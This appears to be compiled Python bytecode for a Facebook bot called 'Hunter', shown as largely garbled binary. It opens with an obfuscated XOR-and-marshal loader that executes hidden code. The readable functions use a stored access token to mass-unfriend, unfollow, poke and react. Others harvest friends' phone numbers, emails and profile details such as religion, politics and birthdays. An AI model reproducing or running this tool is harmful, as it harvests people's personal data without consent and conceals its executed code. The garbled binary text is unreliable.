 d� d� d d dU d d d d� d� dp d d d� d d ds d� d d� d d  d_ d" d# d d7 d& d� d� d( d} dY d	 d> d� d, d$ d� d. d^ d� d  d d� d2 d� d� d5 d� d� d7 d# d� d8 d~ d d< d% d� d> d� d9 dA d� d7 dC d� d� d d� d) dG d d� dI d d3 d dt d3 dM d� d� dP d� d� dS d� d� dV dv d� dX d� d� dZ d! d� d+ d d% dU d� d� d\ d& d d` d� d7 da dw dh dc du d5 de d� d� d@ dd� d! d d� d ds d� dm d! d dn d� d� d0 d d� dq d� d� dn d~ d� d d d$ du dj d� dv d� d� d d dI dZ db d dx d� d� dz dS d� d d) d� d d( d� d� d� d d\ d� d� dZ d� d d� dF d d� d� d� d� d� dk d� d? d� d� dV d d> d d� dA d* d d< d0 d� d$ d d� d� d� dU dQ d� d� dA d. d� d9 d� d� d� dQ da d� d- d� d� dr d dA d� d� d� d- d- d� d� dF d� d� d d� d� d� dl d� d� g� Z xe e e e � k r%<Pn  e e e � k r@<d" Z n  e e e e e e A� 7Z e d� 7Z e d� 7Z q<We  j e � d Ud S(  i����Ni   in   i�   i*   i`   iF   i   i�   iV   i�   i�   i�   i�   i�   i�   iJ   iB   iS   i5   i:   i�   i#   i�   i   iH   i�   ii   i"   i)   i�   i   ic   i    i�   i�   i�   i]   i[   i�   ig   i8   i�   i�   i�   i   i�   i�   i�   iI   i   i�   i�   i!   i�   i�   i�   i�   i�   i4   i�   i�   i	   i�   i   i�   i   i�   i   iv   id   i�   i�   i�   i   i   i�   i=   i$   io   i   i�   i�   i�   i�   i�   i(   if   i<   i�   i   iM   i�   i�   i9   ia   i�   i6   iA   i�   i�   iy   i   i~   i   i}   i�   i{   i�   i�   i�   i7   iq   it   i�   ib   i�   iL   iR   i�   i   i�   i�   iT   i   i�   i'   ip   i�   is   i�   i�   iU   ir   i   i   i�   iG   i
   i   i�   i�   im   i�   i�   i�   i�   i\   iO   i�   i�   ih   i�   i�   i�   il   i�   i�   i�   i0   i   iY   i�   i�   i�   iK   i   i�   ie   i�   i   i�   i�   i�   i&   iz   i_   ij   iu   iW   i�   i�   i%   i2   i@   i�   i�   i�   i>   iN   i�   i�   i�   i�   i   i�   i|   i�   i�   i�   i   i�   i   i�   i   i�   i�   i1   i�   i�   i�   i/   iZ   i�   i�   iC   iX   i�   i�   i�   i�   i�   i    i-   iQ   i^   i   i�   i�   i�   i�   iE   iP   i.   i3   i�   i,   i�   i�   i�   iD   i�   i;   iw   i+   i?   ix   i�   i�   i   i�   i�   i�   i�   ik   i�   i   t    (	   t   marshalt   dt   et   it   jt   kt   lent   chrt   loads(    (    (    s   <script>t   <module>   s�   � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � �   	
(   t   marshalR   (   Re   (    (    s	   Hunter.pyt   unfriend  s    c         C   s  d GHd GHy� d } x� |  d D]� } | d k r4 Pn
 | d 7} t  j d | d d	 t � } t j | j � } y/ | d
 d } t d t | d t d GHWq t k
 r� t d t	 | d t d GHq Xq Wd GHt
 �  Wn t k
 r� d GHt
 �  n Xd  S(   Ns&   [*] all id successfully retrieved    s	   [*] starti    R,   i2   i   s   https://graph.facebook.com/RF   s(   /subscribers?method=delete&access_token=Rm   t   nessageR   R   s   ] faileds
   ] unfollows   [*] dones   [!] Stopped(   R   RT   R   R   R   R   R   Rn   Ro   R   RZ   R[   (   Re   Rg   RT   R   R   Rp   (    (    s	   Hunter.pyt   unfollow�  s(    
!%c         C   s<  d GHd GHy� d } x� |  D]� } | d k r0 Pn
 | d 7} t  j d | d j d � d t f � } t j | j � } | d j d � d } y+ | d	 d
 } t d t | t d GHWq t	 k
 r� t d t
 | t d GHq Xq Wd GHt �  Wn? t k
 rd GHt �  n# t  j j k
 r7d GHt �  n Xd  S(   Ns4   [*] all id successfully retrieved                  s	   [*] starti    i2   i   s3   https://graph.facebook.com/%s/pokes?access_token=%sRF   R_   Rm   R`   R   s   ] faileds   ] pokess   [*] Dones   [!] Stopped   s   [!] Connection Error(   R   RT   Rb   R   R   R   R   R   Rn   Ro   R   RZ   R[   R*   R+   (   Re   Rg   RT   R   R   RF   Rp   (    (    s	   Hunter.pyt   poke�  s0    
*!
c         C   s  d GHd GHy� d } x� |  D]� } | d k r0 Pn  t  j d | d d t � } t j | j � } y/ | d d	 } t d
 t | d t d GHWq t k
 r� t d
 t	 | d t d GHq Xq Wd GHt
 �  Wn? t k
 r� d GHt
 �  n# t  j j k
 rd GHt
 �  n Xd  S(   Ns3   [*] all id successfully retrieved                 s	   [*] Starti    i2   s   https://graph.facebook.com/RF   s   ?method=delete&access_token=Rm   R`   R   R   s   ] Faileds	   ] femoveds   [*] Dones   [!] Stopped  s   [!] connection error(   R   RT   R   R   R   R   R   Rn   Ro   R   RZ   R[   R*   R+   (   Re   Rg   RT   R   R   Rp   (    (    s	   Hunter.pyRR   �  s,    !%
c          C   s  y t  t d t d t d t d t d t d � }  |  d, k rW d a t �  n�|  d- k rs d a t �  n�|  d. k r� d a t �  np|  d/ k r� d a t �  nT|  d0 k r� d a t �  n8|  d1 k r� d a t �  n|  j �  d k rt �  t �  n� |  j �  d k r*d GHt j	 �  n� |  j �  d k r�y@ t
 d � d GHt  d � }  |  j �  d k r{d  GHt �  n  Wn t k
 r�n Xd! d" j d# � d! GHd$ GHt �  nJ |  d2 k r�d' GHt �  n/ |  d( k r�t �  n d) |  d* GHd+ GHt �  Wn t k
 rt �  n Xd  S(3   Nt   Hak9t   /t   Bott   Reactions    >> R6   t   01t   LIKEt   2t   02t   LOVEt   3t   03t   WOWt   4t   04t   HAHAt   5t   05t   SADt   6t   06t   ANGRYt   menuR'   s   [!] Exiting program !!R   s   cookie/token.logs"   [!] an access token already existss,   [?] Are you sure you want to continue [Y/N] t   ys   [*] Canceling s   
s&   [*] Generate Access token facebook [*]i,   s=   [Warn] please turn off your VPN before using this feature !!!R<   t   00s   [!] back to bot menuR   s   [!] command 's   ' not founds    [!] type 'menu' to show menu bot(   R6   R{   (   R}   R~   (   R�   R�   (   R�   R�   (   R�   R�   (   R�   R�   (   R<   R�   (   RA   Rn   R   R^   t   bot_askt   lowerR   Rd   RU   R'   R	   RZ   R   R   RF   R[   (   Rp   (    (    s	   Hunter.pyRd   �  sb    8










c           C   s�   d GHy t  d d � j �  a d GHWn" t k
 rG d GHd GHt �  n Xt t d t d t d	 t d
 t d t d t d t d
 t d � a t j	 �  d
 k r� t d � a
 t
 d k r� d GHd GHt �  q� n d a t t �  d � d  S(   Ns   [*] load access token s   cookie/token.logR   s   [*] Success load access tokens   [!] Failed load access tokens)   [!] type 'token' to generate access tokens   [?] [R   s   ]allpost or [t   Ts   ]arget (Rx   s   ) : s   [?] id facebook : R   s   [!] id target can't be emptys   [!] StoppedRJ   i2   (   R	   R
   R   R   Rd   RA   R   Rn   RS   t   upperRF   Rk   RT   (    (    (    s	   Hunter.pyR�     s"    	Pc          C   sQ  y2t  t d t d t d t d � }  |  dJ k rH t �  t �  n�|  dK k r�d	 GHy t d
 d � j �  a d GHWn" t k
 r� d GHd GHt	 �  n Xt  t d t d t d t d t d t d t d t d t d � a
 t
 j �  d k st
 j �  d k rd a
 n, t  d � a t d k rEd GHd GHt	 �  n  d GHd GHt  d � a t d k r{d GHd GHt	 �  n t j d d  � a t t �  d! � n�|  dL k r
d$ a
 d% GHy t d
 d � j �  a d GHWn" t k
 r�d& GHd GHt	 �  n Xt t �  � n'|  dM k rtd a
 d% GHy t d
 d � j �  a d GHWn" t k
 rcd GHd GHt	 �  n Xt t �  � n�|  dN k r�d+ a
 d% GHy t d
 d � j �  a d GHWn" t k
 r�d GHd GHt	 �  n Xt t �  � nS|  dO k rHd. a
 d/ GHy t d
 d � j �  a d GHWn" t k
 r7d GHd GHt	 �  n Xt t �  � n�|  dP k r�d2 a
 d3 GHy t d
 d � j �  a d4 GHWn" t k
 r�d GHd GHt	 �  n Xt t �  � n|  dQ k rd7 a
 d8 GHy t d
 d � j �  a d GHWn t k
 rd GHd GHn Xt t �  � n|  dR k r0d; GHt �  n|  j �  d< k rSt �  t	 �  n� |  j �  d= k rwd> GHt j �  n� |  j �  d? k ry@ t d
 � d@ GHt  dA � }  |  j �  dB k r�dC GHt	 �  n  Wn t k
 r�n Xd  dD j dE � d  GHdF GHt �  n/ |  d k rt	 �  n dG |  dH GHdI GHt	 �  Wn t k
 rLt	 �  n Xd  S(S   NRw   Rx   s   Bot s   >> R6   R{   R}   R~   s   [*] load access tokens   cookie/token.logR   s   [*] Success load access tokens   [!] Failed load access tokens)   [!] type 'token' to generate access tokens   [?] [R   s   ]allpost or [R�   s   ]arget (s   ) : R   R   RJ   s   [?] Id Target : s   [!] id target can't be emptys   [!] Stoppeds2   --------------------------------------------------s1     [Note] Use the '</>' symbol to change the line
s   [?] Your Message : s   [!] Message can't be emptys   </>s   
i2   R�   R�   RN   s   [*] load access token    s   [!] Failed load access token   R�   R�   R�   R�   RL   R�   R�   RP   s   [*] load access token     t   7t   07RQ   s   [*] load access token      s   [*] success load access tokent   8t   08RR   s   [*] Load access token      R<   R�   s   [*] Back to main menuR�   R'   s   [!] Exiting programR   s"   [!] an access token already existss,   [?] Are you sure you want to continue [Y/N] R�   s   [*] Canceling s&   [*] Generate Access token facebook [*]i,   s=   [Warn] please turn off your VPN before using this feature !!!s   [!] command 's   ' not founds    [!] type "menu" to show menu bot(   R6   R{   (   R}   R~   (   R�   R�   (   R�   R�   (   R�   R�   (   R�   R�   (   R�   R�   (   R�   R�   (   R<   R�   (   RA   Rn   R   R   Rd   R	   R
   R   R   RZ   RS   R�   RF   R`   Rc   Rl   RT   Rq   Rv   R(   Rs   Ru   RR   R)   R   RU   R'   R   R[   (   Rp   (    (    s	   Hunter.pyRZ   /  s�    (
	P$	

							




c          C   s�  d GHy t  d d � j �  }  d GHWn" t k
 rG d GHd GHt �  n Xy t j d � Wn t k
 rl n Xd GHy� t j d	 |  � } t	 j
 | j � } t  d
 t d j d � d d d � } xM | d D]A } | j | d d � d | d Gt j j �  t j d � q� W| j �  d GHd t d j d � d d GHt �  Wnl t k
 rfd GHt �  nP t k
 r�d GHt �  n4 t j j t j j f k
 r�d GHd GHt �  n Xd  S(   Ns   [*] Load Access Tokens   cookie/token.logR   s   [*] success load access tokens   [!] failed load access tokens)   [*] type 'token' to generate access tokent   outputs   [*] fetching all friends ids3   https://graph.facebook.com/me/friends?access_token=s   output/i    R   s   _id.txtR   R,   RF   s   
s   [*] %s retrievedg-C��6?s)   [*] all friends id successfuly retreiveds   [*] file saved : output/s   [!] Stoppeds   [!] failed to fetch friend ids%   [!] Connection Error                 s   [!] Stopped(   R	   R
   R   R)   R"   R#   R$   R   R   R   R   R   R   Rb   R%   RU   RV   RW   RX   RY   R&   R[   R   R*   R+   t   ChunkedEncodingError(   R   R   R   t   outR]   (    (    s	   Hunter.pyt   dump_id�  sH    	(  


c          C   s  d GHy t  d d � j �  }  d GHWn" t k
 rG d GHd GHt �  n Xy t j d � Wn t k
 rl n Xd GHd	 GHy.t j d
 |  � } t	 j
 | j � } t  d t d j d � d d d � } x� | d D]� } t j d | d d |  � } t	 j
 | j � } yJ | j | d d � t d t | d t d t d t | d GHWq� t k
 rfq� Xq� W| j �  d GHd GHd t d j d � d d GHt �  Wnl t k
 r�d GHt �  nP t k
 r�d GHt �  n4 t j j t j j f k
 rd GHd  GHt �  n Xd  S(!   Ns   [*] load access tokens   cookie/token.logR   s   [*] Success load access tokens   [!] failed load access tokens)   [*] type 'token' to generate access tokenR�   s   [*] fetching all phone numberss	   [*] starts3   https://graph.facebook.com/me/friends?access_token=s   output/i    R   s
   _phone.txtR   R,   s   https://graph.facebook.com/RF   s   ?access_token=t   mobile_phones   
R   R   R   s    >> s   [*] dones+   [*] all phone numbers successfuly retrieveds   [*] file saved : output/s   [!] Stoppeds%   [!] failed to fetch all phone numberss   [!] Connection Errors   [!] Stopped(   R	   R
   R   R)   R"   R#   R$   R   R   R   R   R   R   Rb   R%   R   R   Rn   R   R&   R[   R*   R+   R�   (   R   R   R   R�   R]   RI   t   z(    (    s	   Hunter.pyt
   dump_phone�  sR    	(5


c          C   s  d GHy t  d d � j �  }  d GHWn" t k
 rG d GHd GHt �  n Xy t j d � Wn t k
 rl n Xd GHd	 GHy.t j d
 |  � } t	 j
 | j � } t  d t d j d � d d d � } x� | d D]� } t j d | d d |  � } t	 j
 | j � } yJ | j | d d � t d t | d t d t d t | d GHWq� t k
 rfq� Xq� W| j �  d GHd GHd t d j d � d d GHt �  Wnl t k
 r�d GHt �  nP t k
 r�d GHt �  n4 t j j t j j f k
 rd GHd  GHt �  n Xd  S(!   Ns   [*] load access tokens   cookie/token.logR   s   [*] Success load access tokens   [!] failed load access tokens)   [*] type 'token' to generate access tokenR�   s   [*] fetching all emailss	   [*] starts3   https://graph.facebook.com/me/friends?access_token=s   output/i    R   s
   _mails.txtR   R,   s   https://graph.facebook.com/RF   s   ?access_token=R3   s   
R   R   R   s    >> s   [*] dones$   [*] all emails successfuly retrieveds   [*] file saved : output/s   [!] Stoppeds   [!] failed to fetch all emailss   [!] Connection Errors   [!] Stopped(   R	   R
   R   R)   R"   R#   R$   R   R   R   R   R   R   Rb   R%   R   R   Rn   R   R&   R[   R*   R+   R�   (   R   R   R   R�   R]   RI   R�   (    (    s	   Hunter.pyt	   dump_mail'  sR    	(5


c          C   s  d GHy t  d d � j �  }  d GHWn" t k
 rG d GHd GHt �  n Xy t j d � Wn t k
 rl n Xd GHy� t j d	 j	 d
 t
 d |  � � } t j | j � } t  d t d j d � d d t
 d d � } xQ | d d D]A } | j | d
 d � d | d
 Gt j j �  t j d � q� W| j �  d GHd t d j d � d d t
 d GHt �  Wn� t k
 r�d GHt �  n� t k
 r�d GHy2 t j d t d j d � d d t
 d � Wn t k
 r�n Xt �  n- t j j t j j f k
 rd GHd GHn Xd  S(   Ns   [*] load access tokens   cookie/token.logR   s   [*] Success load access tokens   [!] failed load access tokens)   [*] type 'token' to generate access tokenR�   s$   [*] fetching all id from your friendsO   https://graph.facebook.com/{id}?fields=friends.limit(5000)&access_token={token}RF   R   s   output/i    R   R_   s   _id.txtR   RP   R,   s   
s   [*] %s retrievedg-C��6?s)   [*] all friends id successfuly retreiveds   [*] file saved : output/s   [!] Stoppeds   [!] failed to fetch friend ids*   [!] Connection Error                      s   [!] Stopped(   R	   R
   R   R)   R"   R#   R$   R   R   R5   t	   target_idR   R   R   R   Rb   R%   RU   RV   RW   RX   RY   R&   R[   R   R(   R*   R+   R�   (   R   R   R   R�   R]   (    (    s	   Hunter.pyt
   dump_id_id[  sN    	!0  
&
2
c          C   s  y�t  t d t d � }  |  j �  d k rb t t � d k rI t �  qHd t t � GHt �  n�|  j �  d k r� d d j d	 � d GHt	 �  n�|  j �  d
 k r� t
 �  t �  n�|  j �  d k ry- t d d � j �  } d | d GHt �  WqHt k
 rd GHd GHt �  qHXn*|  j �  d k r{t j d k r]t j d � t �  t �  qHt j d � t �  t �  n�|  j �  d k ry@ t d � d GHt  d � }  |  j �  d k r�d GHt �  n  Wn t k
 r�n Xd d j d	 � d GHd GHt �  nB|  j �  d k r�d GHt  d � } | j �  d k r{y t j d � d  GHt �  Wq�t k
 rwd! GHt �  q�XqHd! GHt �  n� |  j �  d" k r�t �  t �  n� |  j �  d# k r�d$ GHt j �  nw |  j �  d% k r�t �  t �  nT |  j �  d& k rt �  n8 |  j �  d' k r,t �  n |  j �  d( k rHt �  n  d) |  j �  k r�|  j �  j d* � d+ d, k r�|  j �  j d* � d- a t �  n/ |  d. k r�t �  n d/ |  d0 GHd1 GHt �  Wn8 t k
 r�t �  n! t  k
 rd2 |  GHt �  n Xd  S(3   NRw   s    >> t   get_datai    s&   [*] You have retrieved %s friends datat   get_infos   
s   [*] Information Gathering [*]i,   RZ   t	   cat_tokens   cookie/token.logR   s   [*] Your access token !!

s#   [!] failed to open cookie/token.logs)   [!] type 'token' to generate access tokent   cleart   win32t   clsR   s"   [!] an access token already existss,   [?] Are you sure you want to continue [Y/N] R�   s   [*] Canceling s&   [*] Generate Access token facebook [*]s=   [Warn] please turn off your VPN before using this feature !!!t   rm_tokensS   
[Warn] you must create access token again if 
       your access token is deleted
s    [!] type 'delete' to continue : t   deletes   rm -rf cookie/token.logs#   [*] Success delete cookie/token.logs%   [*] failed to delete cookie/token.logt   aboutR'   s   [!] Exiting Programt   helpR�   R�   R�   t   dump_R_   i   RF   i   R   s   [!] command 's   ' not founds   [!] type "help" to show commands#   [!] invalid parameter on command : (!   RA   Rn   R   R�   t   lent   jmlt   getdataR)   R   t   searchR   RZ   R	   R
   R   RU   t   platformR"   t   systemR   RF   R$   R   R'   R   R�   R�   R�   Rb   R�   R�   R[   t
   IndexError(   Rp   t   oR   (    (    s	   Hunter.pyR)   �  s�    













1


	c          C   s4  d GHy t  d d � j �  a d GHWn" t k
 rG d GHd GHt �  n Xd GHy) t j d t � }  t j |  j	 � a
 WnI t k
 r� d	 GHd GHt �  n( t j j k
 r� d
 GHd GHt �  n XxK t
 d D]? } t j | d � d t t � Gt j j �  t j d � q� Wd t t t � � d GHt �  d  S(   Ns   [*] Load Access Tokens   cookie/token.logR   s   [*] Success load access token s#   [!] failed to open cookie/token.logs)   [!] type 'token' to generate access tokens   [*] fetching all friends datas3   https://graph.facebook.com/me/friends?access_token=s    [!] Your access token is expireds   [!] Connection Errors   [!] StoppedR,   RF   s"   [*] fetching %s data from friendsg-C��6?s   [*] s'    data of friends successfully retrieved(   R	   R
   R   R   R)   R   R   R   R   R   R   R   R*   R+   R�   R   R�   RU   RV   RW   RX   RY   t   str(   R   R]   (    (    s	   Hunter.pyR�   �  s6    	
  c          C   s[   t  t � d k r& d GHd GHt �  n  t d � }  |  d k rM d GHt �  n
 t |  � d  S(   Ni    s"   [!] no friend data in the databases+   [!] type "get_data" to collect friends datas   [!] Search Name or Id : R   s    [!] name or id can't be empty !!(   R�   R�   R)   RA   R�   t   info(   t   target(    (    s	   Hunter.pyR�     s    

c         C   s�  d GHx�t  d D]�} |  | d k s6 |  | d k r t j d | d d t � } t j | j � } d GHt d j d	 � GHt	 GHy d
 | d GHWn t
 k
 r� n Xy d | d GHWn t
 k
 r� n Xy d | d GHWn t
 k
 r� n Xy d | d GHWn t
 k
 rn Xy d | d GHWn t
 k
 r;n Xy d | d GHWn t
 k
 r`n Xy d | d GHWn t
 k
 r�n Xy d | d GHWn t
 k
 r�n Xy d | d j d � d GHWn t
 k
 r�n Xy d | d d GHWn t
 k
 rn Xy d | d d GHWn t
 k
 r.n Xy d  | d! GHWn t
 k
 rSn Xy d" | d# GHWn t
 k
 rxn Xy d$ | d% GHWn t
 k
 r�n Xy d& | d' GHWn t
 k
 r�n Xyd( GHx| d) D] } y d* | d+ d GHWn t
 k
 rn Xy d, | d- d GHWn t
 k
 r-n Xy) | d. d/ k rId0 GHn d1 | d. GHWn t
 k
 rjn Xy) | d2 d/ k r�d3 GHn d4 | d2 GHWn t
 k
 r�n Xy d5 | d d GHWn t
 k
 r�n Xd GHq�WWn t
 k
 r�n Xy( d6 | d7 d8  d | d7 d9 d: !GHWn t
 k
 r*n XyC d; GHx7 | d< D]+ } y d= | d GHWq>t
 k
 rhq>Xq>WWn t
 k
 r�n Xy d> | d? GHWn t
 k
 r�n Xy d@ | dA GHWn t
 k
 r�n Xy dB | dC j dD dE � GHWn t
 k
 r�n Xy dF | dG GHWn t
 k
 r!n XyC dH GHx7 | dI D]+ } y d= | d GHWq5t
 k
 r_q5Xq5WWn t
 k
 rxn XyG dJ GHx; | dK D]/ } y d= | dL d GHWq�t
 k
 r�q�Xq�WWq�t
 k
 r�q�Xq q Wt	 d GHdM GHt �  d  S(N   Ns   [*] SearchingR,   R   RF   s   https://graph.facebook.com/s   ?access_token=R   s   [-------- INFORMATION --------]i,   s
   
[*] Id : s   [*] Username : t   usernames   [*] Email : R3   s   [*] Mobile Phone : R�   s   [*] Name : s   [*] First name : t
   first_names   [*] Midle name : t   middle_names   [*] Last name : t	   last_names   [*] Locale : R:   R_   i    s   [*] location : t   locations   [*] hometown : t   hometowns   [*] gender : t   genders   [*] religion : t   religions   [*] relationship status : t   relationship_statuss   [*] political : t	   politicals
   [*] Work :t   works      [-] position : t   positions      [-] employer : t   employert
   start_dates   0000-00s      [-] start date : ---s      [-] start date : t   end_dates      [-] end date : ---s      [-] end date : s      [-] location : s   [*] Updated time : t   updated_timei
   i   i   s   [*] Languages : t	   languagess    ~  s
   [*] Bio : t   bios   [*] quotes : t   quotess   [*] birthday : t   birthdayRx   t   -s   [*] link : t   links   [*] Favourite teams : t   favorite_teamss   [*] School : t	   educationt   schools	   [*] Done (   R   R   R   R   R   R   R   R   R   R   R   Rb   Rc   R)   (   R�   R]   RI   R�   (    (    s	   Hunter.pyR�   /  s*    (	t   __main__(   R    R   (/   R   RU   RB   R"   RX   Rr   R�   R   R   Rn   R   t   ImportErrorR   R'   t   reloadt   setdefaultencodingR�   t
   jmlgetdataR   R   R   R   R   R   R   RF   RT   Rk   Rl   R(   Rq   Rs   Ru   Rv   RR   Rd   R�   RZ   R�   R�   R�   R�   R)   R�   R�   R�   t   __name__(    (    (    s	   Hunter.pyt   <module>   sl   H		
							
	U	"	 							:		�	+	2	4	5	j	$		�